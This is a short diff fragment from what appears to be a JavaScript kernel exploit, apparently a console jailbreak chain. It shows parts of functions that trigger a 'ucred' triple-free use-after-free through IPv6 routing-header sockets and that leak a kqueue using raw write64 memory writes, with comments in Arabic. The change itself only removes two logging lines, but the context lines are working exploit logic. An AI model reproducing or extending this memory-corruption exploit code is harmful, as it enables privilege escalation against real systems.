@@ -1322,7 +1322,6 @@ function trigger_ucred_triplefree() {
       close(new BigInt(uaf_socket));
       continue;
     }
-    log('Triple Free Running...');
     // 9) free واحدة من التوأم
     free_rthdr(ipv6_socks[twins[1]]);
 
@@ -1386,8 +1385,6 @@ function trigger_ucred_triplefree() {
 }
 function leak_kqueue() {
   debug('Leaking kqueue...');
-  log('Leaking .....');
-
   // 1) صفّر الذاكرة مرة واحدة فقط
   write64(leak_rthdr.add(0x08), 0);
   write64(leak_rthdr.add(0x98), 0);
